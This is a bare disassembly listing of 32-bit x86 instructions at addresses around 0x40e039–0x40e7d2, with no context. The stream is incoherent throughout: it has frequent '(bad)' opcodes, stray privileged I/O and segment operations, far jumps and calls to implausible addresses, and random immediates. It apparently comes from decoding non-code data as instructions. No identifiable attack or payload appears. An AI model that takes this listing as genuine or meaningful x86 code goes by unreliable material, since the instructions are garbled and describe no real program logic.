  40e039:	mov    esi,0xe04ecbc0
  40e03e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e03f:	imul   DWORD PTR [eax+0x53]
  40e042:	push   ss
  40e043:	sbb    bl,dh
  40e045:	pop    ebp
  40e046:	sub    ecx,DWORD PTR [edx+0x32]
  40e049:	stos   BYTE PTR es:[edi],al
  40e04a:	mov    edi,fs
  40e04c:	neg    BYTE PTR [ebx-0x10]
  40e04f:	fcomp  DWORD PTR [edi+esi*8-0x53b20e69]
  40e056:	loopne 0x40e025
  40e058:	sbb    ch,BYTE PTR [esi+0x71]
  40e05b:	popa   
  40e05c:	jg     0x40e0c8
  40e05e:	aaa    
  40e05f:	jbe    0x40e08a
  40e061:	dec    edi
  40e062:	sub    DWORD PTR [ebx-0x72d07fcd],esi
  40e068:	adc    al,BYTE PTR ds:0x3d89d446
  40e06e:	push   ecx
  40e06f:	xchg   ebp,eax
  40e070:	pop    esp
  40e071:	popa   
  40e072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e073:	adc    DWORD PTR [ebx-0x63e37bba],esp
  40e079:	mov    ch,0xb9
  40e07b:	mov    al,ds:0x3145e88f
  40e080:	cld    
  40e081:	sub    BYTE PTR [edi-0x6a75dd13],ah
  40e087:	push   esi
  40e088:	push   ecx
  40e089:	fwait
  40e08a:	add    DWORD PTR [edi],edi
  40e08c:	ds push 0xffffffa4
  40e08f:	hlt    
  40e090:	shl    dl,cl
  40e092:	sub    esp,esp
  40e094:	push   ss
  40e095:	popf   
  40e096:	outs   dx,BYTE PTR ds:[esi]
  40e097:	mov    cl,0xa4
  40e099:	popf   
  40e09a:	aas    
  40e09b:	mov    cl,0xd3
  40e09d:	nop
  40e09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e09f:	(bad)  [esi+0x5a]
  40e0a2:	enter  0x88df,0xbc
  40e0a6:	mov    ch,BYTE PTR [eax+0x15f38997]
  40e0ac:	ror    DWORD PTR [eax+eiz*4-0x7e05bb37],0x58
  40e0b4:	inc    eax
  40e0b5:	cmp    ecx,0x1b
  40e0b8:	(bad)  
  40e0b9:	daa    
  40e0ba:	xlat   BYTE PTR ds:[ebx]
  40e0bb:	enter  0x3a83,0xdd
  40e0bf:	push   ds
  40e0c0:	sub    dl,al
  40e0c2:	loop   0x40e0da
  40e0c4:	imul   edx,DWORD PTR [ebp-0x312b93c7],0x0
  40e0cb:	lods   al,BYTE PTR ds:[esi]
  40e0cc:	rcr    BYTE PTR [ecx-0x5b],1
  40e0cf:	stc    
  40e0d0:	add    al,0xce
  40e0d2:	pop    edx
  40e0d3:	dec    esp
  40e0d4:	mov    bh,0xcc
  40e0d6:	dec    esp
  40e0d7:	fmul   QWORD PTR [eax+0x1e]
  40e0da:	push   eax
  40e0db:	hlt    
  40e0dc:	mov    ds:0x40025c70,al
  40e0e1:	cld    
  40e0e2:	jnp    0x40e0d4
  40e0e4:	inc    edx
  40e0e5:	push   es
  40e0e6:	jns    0x40e10e
  40e0e8:	in     al,0x62
  40e0ea:	adc    bl,bh
  40e0ec:	pop    ds
  40e0ed:	pmaxsw mm6,QWORD PTR [edi]
  40e0f0:	jns    0x40e144
  40e0f2:	cmp    esi,edx
  40e0f4:	(bad)  
  40e0f6:	das    
  40e0f7:	sbb    eax,0xa96c3984
  40e0fc:	add    BYTE PTR [ebx+0x1d],bl
  40e0ff:	push   ecx
  40e100:	pop    ebp
  40e101:	push   ecx
  40e102:	jbe    0x40e0e6
  40e104:	loopne 0x40e141
  40e106:	arpl   WORD PTR [ebx-0x41],dx
  40e109:	xlat   BYTE PTR ds:[ebx]
  40e10a:	or     eax,0x92896db
  40e10f:	inc    edx
  40e110:	std    
  40e111:	jb     0x40e177
  40e113:	xchg   DWORD PTR [eax-0x49],edi
  40e116:	cmc    
  40e117:	cli    
  40e118:	or     DWORD PTR [ebx],esp
  40e11a:	sbb    dl,bh
  40e11c:	push   es
  40e11d:	push   ds
  40e11e:	retf   
  40e11f:	out    dx,al
  40e120:	cld    
  40e121:	xor    BYTE PTR [ebx-0x70],0xfc
  40e125:	(bad)  
  40e126:	sbb    esp,ebp
  40e128:	add    eax,0x20dc8ee1
  40e12d:	sub    DWORD PTR [eax-0x63],eax
  40e130:	into   
  40e131:	icebp  
  40e132:	or     bh,BYTE PTR [ecx+0x0]
  40e135:	(bad)  
  40e137:	inc    edi
  40e138:	sbb    DWORD PTR [eax-0x72df7563],ebp
  40e13e:	ja     0x40e1b2
  40e140:	es gs mov ecx,0x6021245c
  40e147:	cmp    eax,0x99f44afd
  40e14c:	jecxz  0x40e0e3
  40e14e:	cmp    DWORD PTR [eax],edx
  40e150:	xor    DWORD PTR [ecx-0x53293cc9],ebx
  40e156:	aad    0x10
  40e158:	sbb    edi,DWORD PTR ss:[ecx+ebx*1]
  40e15c:	mov    al,ds:0xd8917c9b
  40e161:	ret    
  40e162:	arpl   WORD PTR [edx],di
  40e164:	dec    ecx
  40e165:	jno    0x40e1e1
  40e167:	xchg   DWORD PTR [eax],esi
  40e169:	lea    eax,[edx+ebx*2+0x1b407d3]
  40e170:	sbb    al,0x7c
  40e172:	ret    
  40e173:	push   0x70
  40e175:	cmp    edx,DWORD PTR [eax+0x52]
  40e178:	iret   
  40e179:	cs sbb al,0x59
  40e17c:	dec    eax
  40e17d:	leave  
  40e17e:	pop    ss
  40e17f:	fidivr DWORD PTR [ecx+edi*8]
  40e182:	push   0x2d6b08bc
  40e187:	pop    es
  40e188:	lods   al,BYTE PTR ds:[esi]
  40e189:	call   0x5f059d76
  40e18e:	mov    bh,0x33
  40e190:	repnz and cl,dl
  40e193:	rol    edx,0xed
  40e196:	pusha  
  40e197:	(bad)  [edi+0x1763032e]
  40e19d:	fs xor dh,cl
  40e1a0:	push   0xffffff96
  40e1a2:	ins    DWORD PTR es:[edi],dx
  40e1a3:	cmp    esi,DWORD PTR [ecx]
  40e1a5:	pop    ss
  40e1a6:	mov    ss,ebp
  40e1a8:	mov    edi,0xd1759ee4
  40e1ad:	push   0x70a733c6
  40e1b2:	or     al,0x6d
  40e1b4:	mov    ch,0x1c
  40e1b6:	jae    0x40e177
  40e1b8:	jae    0x40e17d
  40e1ba:	rcr    DWORD PTR [edx-0x3944bf88],cl
  40e1c0:	retf   0x1ea7
  40e1c3:	dec    ebx
  40e1c4:	fild   WORD PTR [edx+0x45caedd1]
  40e1ca:	aad    0x4e
  40e1cc:	loope  0x40e163
  40e1ce:	mov    cl,0x77
  40e1d0:	lods   eax,DWORD PTR ds:[esi]
  40e1d1:	pop    esi
  40e1d2:	dec    ecx
  40e1d3:	into   
  40e1d4:	push   ds
  40e1d5:	mov    cl,0x91
  40e1d7:	push   eax
  40e1d8:	cwde   
  40e1d9:	(bad)  
  40e1da:	jne    0x40e1b7
  40e1dc:	sbb    al,cl
  40e1de:	dec    esi
  40e1df:	xchg   BYTE PTR [eax-0x474cf0c2],dh
  40e1e5:	(bad)  
  40e1e6:	pop    ebx
  40e1e7:	retf   
  40e1e8:	xchg   ebx,eax
  40e1e9:	rep outs dx,BYTE PTR ds:[esi]
  40e1eb:	pop    ds
  40e1ec:	ins    BYTE PTR es:[edi],dx
  40e1ed:	xor    eax,0x39f04c2c
  40e1f2:	mov    esi,0xedb0966c
  40e1f7:	les    esi,FWORD PTR [ebx-0xb]
  40e1fa:	xor    eax,0x6f4d9b29
  40e1ff:	repz push edx
  40e201:	jbe    0x40e1aa
  40e203:	mov    eax,0x274ff4d5
  40e208:	cmp    ebx,0xffffffa8
  40e20b:	mov    ah,0xa2
  40e20d:	xor    al,0xf4
  40e20f:	pop    ds
  40e210:	sub    al,0xb6
  40e212:	fdiv   DWORD PTR [esi]
  40e214:	imul   ecx,DWORD PTR [ecx+eiz*8+0x3f],0xffffffb4
  40e219:	xlat   BYTE PTR ds:[ebx]
  40e21a:	jae    0x40e1be
  40e21c:	cmp    eax,0x8f1c864a
  40e221:	imul   edx,DWORD PTR [ebx-0x44],0xd0ac7040
  40e228:	push   ebp
  40e229:	xchg   ecx,eax
  40e22a:	and    bh,al
  40e22c:	mov    ebx,0x88be7342
  40e231:	aaa    
  40e232:	repz xlat BYTE PTR ds:[ebx]
  40e234:	xchg   ecx,eax
  40e235:	fisubr DWORD PTR [ebx]
  40e237:	daa    
  40e238:	and    BYTE PTR [esi-0x29],0x19
  40e23c:	sub    eax,0xa4d0fb9b
  40e241:	or     eax,0x52b541c2
  40e247:	outs   dx,DWORD PTR ds:[esi]
  40e248:	sti    
  40e249:	pop    ss
  40e24a:	loop   0x40e276
  40e24c:	js     0x40e25d
  40e24e:	jmp    0xe18e:0x5c18eacc
  40e255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e256:	mov    BYTE PTR [eax-0x19],0xb9
  40e25a:	or     BYTE PTR [esi+edx*4+0x1ae4f19d],dh
  40e261:	les    ebp,FWORD PTR [esi]
  40e263:	out    0x37,al
  40e265:	xchg   ebx,eax
  40e266:	fldenv [eax]
  40e268:	loopne 0x40e217
  40e26a:	pop    edx
  40e26b:	pop    edi
  40e26c:	mov    ch,0xb2
  40e26e:	(bad)  
  40e270:	in     eax,dx
  40e271:	shr    BYTE PTR [ebp-0x69493881],1
  40e277:	and    al,0x80
  40e279:	push   ds
  40e27a:	cwde   
  40e27b:	sub    eax,0xa0e09ce8
  40e280:	sbb    al,0x17
  40e282:	sar    BYTE PTR [ecx],0x1f
  40e285:	clc    
  40e286:	or     BYTE PTR [ebx-0x54],cl
  40e289:	push   esi
  40e28a:	imul   edx,DWORD PTR [edx-0x4],0x1b
  40e28e:	sub    eax,0x227bd39c
  40e293:	mov    BYTE PTR [ecx+0x79],bh
  40e296:	add    BYTE PTR [eax-0xde6b72f],0xd3
  40e29d:	lods   al,BYTE PTR ds:[esi]
  40e29e:	imul   edi,DWORD PTR ds:0xcc7d35f,0x51a88483
  40e2a8:	sub    bl,bh
  40e2aa:	add    eax,DWORD PTR [ecx]
  40e2ac:	mov    ah,0x76
  40e2ae:	lea    ebp,[ebx-0x6c87c903]
  40e2b4:	aam    0x82
  40e2b6:	lods   eax,DWORD PTR ds:[esi]
  40e2b7:	imul   eax,DWORD PTR [ecx+0x7b80b76f],0xffffffc0
  40e2be:	dec    edx
  40e2bf:	imul   edx,esi,0x1a655ff7
  40e2c5:	lods   al,BYTE PTR ds:[esi]
  40e2c6:	out    dx,al
  40e2c7:	jle    0x40e25d
  40e2c9:	aam    0x30
  40e2cb:	popf   
  40e2cc:	or     dl,BYTE PTR [edx+0x56]
  40e2cf:	lea    esp,[esi-0x8ecaeef]
  40e2d5:	cmp    eax,0xac4fae09
  40e2da:	out    dx,al
  40e2db:	cmp    cl,BYTE PTR [ecx+0x4cf204af]
  40e2e1:	sahf   
  40e2e2:	push   0xdfcaa130
  40e2e7:	dec    esp
  40e2e8:	sbb    dh,BYTE PTR [edi-0x1ec35989]
  40e2ee:	dec    ecx
  40e2ef:	mov    bl,0x52
  40e2f1:	mov    dl,0xf8
  40e2f3:	fisttp QWORD PTR [ecx]
  40e2f5:	ins    DWORD PTR es:[edi],dx
  40e2f6:	loope  0x40e321
  40e2f8:	aad    0x21
  40e2fa:	aad    0xbe
  40e2fc:	loope  0x40e2a4
  40e2fe:	dec    ebp
  40e2ff:	cmp    ecx,DWORD PTR [ebx+eiz*2+0x27c7897b]
  40e306:	push   ebx
  40e307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e308:	sub    esp,0xbcbbd1d6
  40e30e:	cmp    BYTE PTR [eax+0x7c99afcd],0x89
  40e315:	inc    bp
  40e317:	stc    
  40e318:	and    bl,bh
  40e31a:	add    ebx,DWORD PTR [esi]
  40e31c:	mov    ?,WORD PTR [ecx-0x54]
  40e31f:	mov    dh,0x98
  40e321:	les    ebp,FWORD PTR [ebx]
  40e323:	or     al,0xf1
  40e325:	jmp    0xb02a:0xac4eb1ed
  40e32c:	push   ds
  40e32d:	gs mov esp,0x3228b0b7
  40e333:	(bad)  [eax-0x75434149]
  40e339:	ja     0x40e38c
  40e33b:	in     al,0x1d
  40e33d:	add    DWORD PTR [ebx-0x33],edx
  40e340:	xor    al,BYTE PTR [ebp-0xd]
  40e343:	pop    edx
  40e344:	call   0xa193e2f7
  40e349:	repnz nop
  40e34b:	test   al,0x74
  40e34d:	sti    
  40e34e:	push   eax
  40e34f:	sub    BYTE PTR [ecx+0x6ae49e91],al
  40e355:	setg   BYTE PTR [esi-0x18]
  40e359:	and    edi,edx
  40e35b:	mov    cl,0xc
  40e35d:	pop    edx
  40e35e:	jnp    0x40e304
  40e360:	mov    ebx,DWORD PTR [edi]
  40e362:	add    ebx,DWORD PTR [edi+eax*2]
  40e365:	inc    ebx
  40e366:	imul   ebp,eax,0xbcdf2a5d
  40e36c:	cmp    edi,DWORD PTR [edx]
  40e36e:	xor    edi,DWORD PTR [ecx+0x7]
  40e371:	lods   eax,DWORD PTR ds:[esi]
  40e372:	mov    ebp,0xdadcf28
  40e377:	and    ebx,DWORD PTR [edx+0x4]
  40e37a:	cmp    esi,edx
  40e37c:	mov    al,0x6f
  40e37e:	js     0x40e3d1
  40e380:	xor    eax,0x5a976778
  40e385:	in     al,dx
  40e386:	add    eax,0xcca7ef13
  40e38b:	pop    edx
  40e38c:	pop    esp
  40e38d:	pushf  
  40e38e:	push   0x95b5157d
  40e393:	int    0xeb
  40e395:	mov    cl,0xea
  40e397:	pop    esi
  40e398:	test   eax,0xeed70335
  40e39d:	cmp    cl,al
  40e39f:	jle    0x40e402
  40e3a1:	stc    
  40e3a2:	add    edx,DWORD PTR [edi+0x382d2e85]
  40e3a8:	cmc    
  40e3a9:	mov    eax,0x8099a1e7
  40e3ae:	aas    
  40e3af:	xor    eax,0xc02de64c
  40e3b4:	js     0x40e3da
  40e3b6:	pop    eax
  40e3b7:	es aaa 
  40e3b9:	(bad)  
  40e3ba:	mov    eax,ds:0xe6561665
  40e3bf:	cmp    esi,edx
  40e3c1:	xchg   ecx,eax
  40e3c2:	sbb    ebp,DWORD PTR ds:0xd86c3ece
  40e3c8:	jnp    0x40e34a
  40e3ca:	cld    
  40e3cb:	sub    BYTE PTR [edi-0x36441107],dh
  40e3d1:	and    BYTE PTR [esi],ah
  40e3d3:	jl     0x40e40c
  40e3d5:	or     ch,ah
  40e3d7:	pop    eax
  40e3d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3d9:	mov    ds:0x9bcaf49f,eax
  40e3de:	jnp    0x40e3ba
  40e3e0:	dec    edi
  40e3e1:	clc    
  40e3e2:	inc    esi
  40e3e3:	ds sbb eax,ebp
  40e3e6:	fild   DWORD PTR [ebx+ebp*4+0x7cd6da0f]
  40e3ed:	mov    ebx,0x17c917be
  40e3f2:	mov    al,ds:0x9724ab9a
  40e3f7:	enter  0x59e4,0x2b
  40e3fb:	aaa    
  40e3fc:	shl    cl,cl
  40e3fe:	or     al,0x6e
  40e400:	or     al,0xb5
  40e402:	cmp    al,0x9c
  40e404:	xchg   edx,eax
  40e405:	sbb    bh,bh
  40e407:	arpl   bp,sp
  40e409:	jns    0x40e398
  40e40b:	inc    esi
  40e40c:	enter  0xc264,0xb1
  40e410:	jle    0x40e43d
  40e412:	jp     0x40e43a
  40e414:	gs loope 0x40e3b6
  40e417:	inc    ebp
  40e418:	inc    ecx
  40e419:	ds ins BYTE PTR es:[edi],dx
  40e41b:	std    
  40e41c:	mov    dh,0x9e
  40e41e:	cmp    ch,0xc5
  40e421:	sub    BYTE PTR [ebx-0x66453a0f],ah
  40e427:	adc    DWORD PTR [edx+0x6f],eax
  40e42a:	cmp    eax,0x77571c75
  40e42f:	stos   BYTE PTR es:[edi],al
  40e430:	inc    esp
  40e431:	int3   
  40e432:	int    0x8a
  40e434:	rol    ah,1
  40e436:	push   es
  40e437:	jns    0x40e47a
  40e439:	(bad)  
  40e43a:	enter  0x1225,0x4f
  40e43e:	jno    0x40e4bd
  40e440:	ins    DWORD PTR es:[edi],dx
  40e441:	loopne 0x40e425
  40e443:	or     eax,0x1e8bdc98
  40e448:	inc    eax
  40e449:	mov    eax,ds:0x53db7f5a
  40e44e:	dec    ebx
  40e44f:	repnz das 
  40e451:	call   0x143600b4
  40e456:	cmp    al,0x4
  40e458:	xchg   ecx,eax
  40e459:	idiv   bl
  40e45b:	mov    eax,ds:0x3240d76b
  40e460:	jle    0x40e4b3
  40e462:	sub    eax,0x54e15512
  40e467:	lea    ebx,[ecx+0x18]
  40e46a:	push   ebx
  40e46b:	mov    ecx,0x7d03d2a
  40e470:	mov    dh,0x10
  40e472:	push   es
  40e473:	fldenv [ebx+0x59]
  40e476:	jne    0x40e4a6
  40e478:	inc    ecx
  40e479:	mov    esi,0xdc9ff3d1
  40e47f:	xchg   DWORD PTR [ebp-0x374b9ebb],edi
  40e485:	add    BYTE PTR [eax+0x557b20a3],cl
  40e48b:	in     eax,0x39
  40e48d:	and    DWORD PTR [edi-0x381f9195],ebp
  40e493:	mov    ebp,0xffb794ee
  40e498:	js     0x40e44d
  40e49a:	mov    ?,WORD PTR [ecx-0x74]
  40e49d:	addr16 out 0xbd,eax
  40e4a0:	jno    0x40e4ab
  40e4a2:	dec    eax
  40e4a3:	push   ds
  40e4a4:	mov    WORD PTR [edi-0x6c],fs
  40e4a7:	fiadd  WORD PTR [ebx+0x5e90b8d3]
  40e4ad:	ret    
  40e4ae:	mov    edi,0x8c5fdb57
  40e4b3:	xchg   esp,eax
  40e4b4:	fwait
  40e4b5:	sbb    eax,0x23169218
  40e4ba:	pusha  
  40e4bb:	sub    al,BYTE PTR [ecx+esi*4+0x48]
  40e4bf:	hlt    
  40e4c0:	popa   
  40e4c1:	mov    esi,0x49013edc
  40e4c6:	jno    0x40e505
  40e4c8:	push   edi
  40e4c9:	jp     0x40e499
  40e4cb:	sbb    eax,0x74f0633f
  40e4d0:	stc    
  40e4d1:	sbb    ecx,DWORD PTR [ecx]
  40e4d3:	adc    al,0x92
  40e4d5:	cmp    esi,DWORD PTR [eax+0x524ca4e6]
  40e4db:	in     al,0xfe
  40e4dd:	loope  0x40e4fe
  40e4df:	sbb    BYTE PTR [ecx-0x2cd926dc],dh
  40e4e5:	xchg   esp,eax
  40e4e6:	shl    DWORD PTR [ecx],0x7b
  40e4e9:	mov    ?,WORD PTR [esi+eax*2+0x1f]
  40e4ed:	jg     0x40e4e3
  40e4ef:	fild   QWORD PTR [esi+0x43]
  40e4f2:	push   ebp
  40e4f3:	mov    bh,0xef
  40e4f5:	div    edi
  40e4f7:	loope  0x40e55a
  40e4f9:	inc    edx
  40e4fa:	test   ebx,esp
  40e4fc:	jbe    0x40e529
  40e4fe:	out    dx,eax
  40e4ff:	test   eax,0x230f81e6
  40e504:	dec    ecx
  40e505:	fdivr  DWORD PTR [ecx-0x1f]
  40e508:	enter  0x1198,0x59
  40e50c:	lock cdq 
  40e50e:	int3   
  40e50f:	neg    DWORD PTR [ebp-0x116b0f48]
  40e515:	arpl   WORD PTR [ecx+0x41db6f43],cx
  40e51b:	and    esi,DWORD PTR [ebp+0x2ef1185b]
  40e521:	dec    ecx
  40e522:	addr16 pop ds
  40e524:	fidiv  DWORD PTR [ebx+0x21691293]
  40e52a:	loopne 0x40e527
  40e52c:	or     al,0xce
  40e52e:	xchg   ecx,eax
  40e52f:	test   BYTE PTR [edx],al
  40e531:	in     eax,0x90
  40e533:	xchg   ebp,eax
  40e534:	xor    esp,DWORD PTR [ebx]
  40e536:	jno    0x40e4f6
  40e538:	sub    BYTE PTR [edi+0x7c5b3397],al
  40e53e:	pop    es
  40e53f:	xor    BYTE PTR [edx],bh
  40e541:	sahf   
  40e542:	and    al,0xaf
  40e544:	adc    eax,0xb7b5e9
  40e549:	dec    eax
  40e54a:	jmp    0x45a6:0x4ccfde37
  40e551:	mov    ss,WORD PTR [ecx]
  40e553:	aaa    
  40e554:	enter  0x15cc,0x70
  40e558:	mov    gs:0x7e88fb50,eax
  40e55e:	aaa    
  40e55f:	shr    DWORD PTR ds:0x5138ed5,0x43
  40e566:	jp     0x40e56e
  40e568:	mov    cl,0xe7
  40e56a:	pop    esi
  40e56b:	and    bl,dh
  40e56d:	cmp    eax,DWORD PTR [edi-0x54]
  40e570:	pop    edi
  40e571:	or     al,0x69
  40e573:	fnsave [ebx]
  40e575:	inc    eax
  40e576:	cmp    al,0x48
  40e578:	pop    ds
  40e579:	jmp    0xaf9e:0xb428f2e4
  40e580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e581:	sub    ax,0x5f77
  40e585:	xchg   esi,eax
  40e586:	out    dx,al
  40e587:	pop    DWORD PTR [eax-0x6c]
  40e58a:	cwde   
  40e58b:	mov    ebp,0x8a325c27
  40e590:	imul   edi,DWORD PTR [esi+0x25],0x9ec9c1de
  40e597:	mov    ?,WORD PTR [esi+0x637d1e37]
  40e59d:	dec    ecx
  40e59e:	mov    ebp,0x4d09b433
  40e5a3:	or     al,0xb5
  40e5a5:	jle    0x40e607
  40e5a7:	mov    dl,0x5c
  40e5a9:	or     ah,BYTE PTR [ebp*8-0x9a200f0]
  40e5b0:	imul   esi,ebx,0x411c01de
  40e5b6:	dec    edx
  40e5b7:	nop
  40e5b8:	push   ebx
  40e5b9:	call   FWORD PTR [eax+0x4c]
  40e5bc:	xchg   BYTE PTR [edx],dh
  40e5be:	fidivr DWORD PTR [esi+0x61]
  40e5c1:	mov    esi,0x647867dc
  40e5c6:	loope  0x40e61a
  40e5c8:	popa   
  40e5c9:	mov    ebp,0x3f8ba841
  40e5ce:	fist   WORD PTR [eax+0x8f41074]
  40e5d4:	adc    edi,ebx
  40e5d6:	xchg   BYTE PTR cs:[esp+eax*1-0x20],bl
  40e5db:	imul   esi,edx,0xfe3ccc5b
  40e5e1:	jmp    0x827b:0x7269dcd3
  40e5e8:	push   es
  40e5e9:	cmp    DWORD PTR [eax],0x55
  40e5ec:	cmp    BYTE PTR [edx+0x6c],ch
  40e5ef:	lds    edx,FWORD PTR [ebx]
  40e5f1:	pop    eax
  40e5f2:	(bad)  
  40e5f3:	mov    al,ds:0x4fe4adff
  40e5f8:	inc    esp
  40e5f9:	ss xchg ebx,eax
  40e5fb:	and    eax,0xf70de28c
  40e600:	rol    esp,0xa8
  40e603:	xor    al,dh
  40e605:	idiv   DWORD PTR [eax+0x19]
  40e608:	pop    ebp
  40e609:	repz push es
  40e60b:	and    edi,esi
  40e60d:	adc    al,0xf7
  40e60f:	mov    cl,0xb1
  40e611:	shl    DWORD PTR [ebp-0x53],1
  40e614:	jo     0x40e645
  40e616:	cmp    DWORD PTR [ebp+ebp*4+0x69],edx
  40e61a:	jg     0x40e5b9
  40e61c:	and    BYTE PTR [ebp+0x3a],ah
  40e61f:	cwde   
  40e620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e621:	or     BYTE PTR [ebp-0xe],bl
  40e624:	pop    ebp
  40e625:	popa   
  40e626:	(bad)  
  40e627:	iret   
  40e628:	jns    0x40e643
  40e62a:	int3   
  40e62b:	mov    esi,0x8d737951
  40e630:	jb     0x40e656
  40e632:	pushf  
  40e633:	mov    bh,0xe
  40e635:	out    0xef,al
  40e637:	mov    eax,ds:0x8dacb896
  40e63c:	push   ebx
  40e63d:	out    0x1,al
  40e63f:	lahf   
  40e640:	sbb    al,0x54
  40e642:	outs   dx,BYTE PTR ds:[esi]
  40e643:	jmp    0x40e6a7
  40e645:	sbb    DWORD PTR [ebp+0x38],esi
  40e648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e649:	pop    eax
  40e64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e64b:	pop    esp
  40e64c:	xor    bl,bl
  40e64e:	sub    esi,0xffffffdc
  40e651:	(bad)  
  40e652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e653:	in     al,0xca
  40e655:	inc    eax
  40e656:	mov    esp,0x4183a820
  40e65b:	sub    eax,0x9d3c5070
  40e660:	sahf   
  40e661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e662:	and    dh,ch
  40e664:	ss push esp
  40e666:	dec    esp
  40e667:	adc    bl,BYTE PTR ds:0xf0149361
  40e66d:	inc    esp
  40e66e:	aam    0x1c
  40e670:	adc    ecx,esi
  40e672:	mov    ebp,0x50dbe5c7
  40e677:	inc    esp
  40e678:	xor    edi,DWORD PTR [eax-0xa]
  40e67b:	mov    ch,0xe7
  40e67d:	xor    cl,bh
  40e67f:	hlt    
  40e680:	daa    
  40e681:	xchg   ebx,eax
  40e682:	cmp    al,0x3f
  40e684:	dec    ebx
  40e685:	inc    ebx
  40e686:	xor    eax,0x3db2e8fd
  40e68b:	js     0x40e6d0
  40e68d:	xor    ebx,DWORD PTR [edx+0x76a0ffd5]
  40e693:	dec    ecx
  40e694:	mov    ebp,0x3d48a5ab
  40e699:	nop
  40e69a:	stc    
  40e69b:	mov    ds:0xe29edcea,al
  40e6a0:	xor    eax,0xed300dc4
  40e6a5:	mov    al,ds:0xc6270d88
  40e6aa:	in     eax,0x4a
  40e6ac:	cmp    ah,BYTE PTR [esi-0x59]
  40e6af:	inc    edx
  40e6b0:	leave  
  40e6b1:	xchg   BYTE PTR [eax+0x35],cl
  40e6b4:	in     al,dx
  40e6b5:	adc    DWORD PTR [esi],0x41c7758
  40e6bb:	sbb    eax,0x4bcdd3a0
  40e6c0:	scas   al,BYTE PTR es:[edi]
  40e6c1:	sbb    bh,BYTE PTR [edx+0x62846bb5]
  40e6c7:	cmp    BYTE PTR [eax+0x1a39fc0e],cl
  40e6cd:	mov    edx,0x7bd55e6d
  40e6d2:	mov    bh,0x3d
  40e6d4:	ds xchg edx,eax
  40e6d6:	xor    dh,ch
  40e6d8:	aad    0x78
  40e6da:	pusha  
  40e6db:	pop    ss
  40e6dc:	dec    esi
  40e6dd:	popf   
  40e6de:	mov    ebx,0x64e016f8
  40e6e3:	hlt    
  40e6e4:	jge    0x40e68e
  40e6e6:	(bad)  
  40e6e7:	xchg   ebx,eax
  40e6e8:	xor    al,0xe0
  40e6eb:	and    eax,0xd2673b8b
  40e6f0:	ja     0x40e6ed
  40e6f2:	fimul  WORD PTR [esi-0x17]
  40e6f5:	retf   
  40e6f6:	int    0xa2
  40e6f8:	(bad)  
  40e6f9:	jns    0x40e749
  40e6fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fc:	add    al,BYTE PTR [ebx-0x26dcac29]
  40e702:	cmp    DWORD PTR [ebx+0x46c0d8d9],ebp
  40e708:	addr16 inc eax
  40e70a:	es add dh,0xa5
  40e70e:	js     0x40e6f8
  40e710:	jne    0x40e733
  40e712:	shl    DWORD PTR [esi+0x6d],0x3b
  40e716:	pop    edi
  40e717:	push   edi
  40e718:	sti    
  40e719:	or     eax,0xc803a595
  40e71e:	mov    eax,ds:0xa857174a
  40e723:	add    eax,0xe7923d
  40e728:	jno    0x40e70c
  40e72a:	ror    cl,0xad
  40e72d:	add    bh,BYTE PTR [edi]
  40e72f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e730:	enter  0xb040,0xa
  40e734:	shr    DWORD PTR [edx],cl
  40e736:	std    
  40e737:	(bad)  
  40e738:	fisub  WORD PTR [ebx+edx*2]
  40e73b:	test   BYTE PTR [ecx],bl
  40e73d:	shl    ebx,1
  40e73f:	jnp    0x40e730
  40e741:	push   cs
  40e742:	push   0x57
  40e744:	fild   DWORD PTR [esi+0x1cfb5066]
  40e74a:	jno    0x40e7ad
  40e74c:	in     eax,dx
  40e74d:	(bad)  
  40e74e:	cmp    DWORD PTR [edi+0x46],ebp
  40e751:	and    bh,BYTE PTR [ecx+edi*1+0x359aebc3]
  40e758:	add    BYTE PTR [edx+0x3],ch
  40e75b:	xor    al,0xe0
  40e75d:	sbb    al,BYTE PTR [ebp+0x42]
  40e760:	push   0xfabd076
  40e765:	iret   
  40e766:	sbb    BYTE PTR [esi-0x546532e1],ah
  40e76c:	inc    ebp
  40e76d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e76e:	sti    
  40e76f:	sub    eax,0x5a8bd36c
  40e774:	shl    BYTE PTR [ebp+0x6bdc539],0xd2
  40e77b:	cmp    al,0x46
  40e77d:	cld    
  40e77e:	enter  0x41b7,0x3
  40e782:	dec    ecx
  40e783:	ds scas al,BYTE PTR es:[edi]
  40e785:	bound  ebx,QWORD PTR [eax]
  40e787:	dec    esp
  40e788:	loop   0x40e72d
  40e78a:	jns    0x40e78f
  40e78c:	xchg   esi,eax
  40e78d:	dec    ebx
  40e78e:	out    0xc0,eax
  40e790:	pop    ebx
  40e791:	mov    ecx,edx
  40e793:	(bad)  
  40e794:	aad    0x9b
  40e796:	sbb    DWORD PTR [esi+0x55665ea0],edx
  40e79c:	adc    edi,DWORD PTR [eax-0x164844db]
  40e7a2:	mov    bh,BYTE PTR [ecx]
  40e7a4:	dec    ecx
  40e7a5:	stos   BYTE PTR es:[edi],al
  40e7a6:	cmp    al,0x24
  40e7a8:	mov    bh,0xa2
  40e7aa:	in     eax,dx
  40e7ab:	fdiv   QWORD PTR [eax-0x49076927]
  40e7b2:	xchg   ebx,eax
  40e7b3:	jo     0x40e7d2
  40e7b5:	pushf  
  40e7b6:	push   ebp
  40e7b7:	(bad)  
  40e7b8:	dec    esi
  40e7b9:	mov    bl,0x60
  40e7bb:	aas    
  40e7bc:	push   es
  40e7bd:	jnp    0x40e7a1
  40e7bf:	cmp    eax,0xcd92e242
  40e7c4:	retf   
  40e7c5:	in     eax,0x28
  40e7c7:	cmp    eax,0x3e86eac3
  40e7cc:	fs int 0x44
  40e7cf:	mov    bl,0x24
  40e7d1:	(bad)  
  40e7d2:	sub    al,ch
